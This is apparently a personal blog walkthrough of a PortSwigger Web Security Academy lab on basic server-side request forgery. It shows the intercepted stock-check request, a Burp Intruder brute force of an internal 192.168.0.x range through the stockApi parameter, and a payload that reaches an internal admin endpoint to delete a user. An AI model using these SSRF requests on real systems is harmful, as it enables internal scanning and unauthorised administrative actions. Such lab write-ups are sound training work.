---
title: "SSRF: challange 2"
date: "2024-02-09"
thumbnail: "/assets/img/thumbnail/ssrf.png"
---

#  Basic SSRF against another back-end system
---

Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

### solution

- start the lab and remember the objective is to open `/admin` and delete the user carlos
- if u try going to `/admin` endpoint, you will n't get the result as u can't access it directly.
- so let's go to products and click check stock as challange describtion said
- intercept this request

```
POST /product/stock HTTP/1.1
Host: 0aa4001c041a5c3f81caca2000520096.web-security-academy.net
Cookie: session=2Gw97cnP5g3C7q7rHceYJzb6gt78siRj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa4001c041a5c3f81caca2000520096.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0aa4001c041a5c3f81caca2000520096.web-security-academy.net
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- notice that stockApi parameter has a url as a value, so let's try to change it to `http://192.168.0.x:8080/admin` as said in describtion.
- we don't know the value of x so we will send the request to the intruder for brute forcing to be like this

```
POST /product/stock HTTP/1.1
Host: 0aa4001c041a5c3f81caca2000520096.web-security-academy.net
Cookie: session=2Gw97cnP5g3C7q7rHceYJzb6gt78siRj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa4001c041a5c3f81caca2000520096.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0aa4001c041a5c3f81caca2000520096.web-security-academy.net
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http://192.168.0.§x§:8080/admin
```

- notice that x is between two of § character, as it's parameter of the brute force
- to choose the values of it we will go to `payloads` tab
- change payload type to `numbers` and make it ranges from 0 to 255 with step 1
- start the attack and wait until you see a request with status 200
- when you find it this means that this is the suitable ip
- back to the repeater and use it with changing the value of the stockApi to: `/admin/delete?username=carlos`
- carlos is deleted
- congratzzzzzzzzzzzzzzzzzzzzz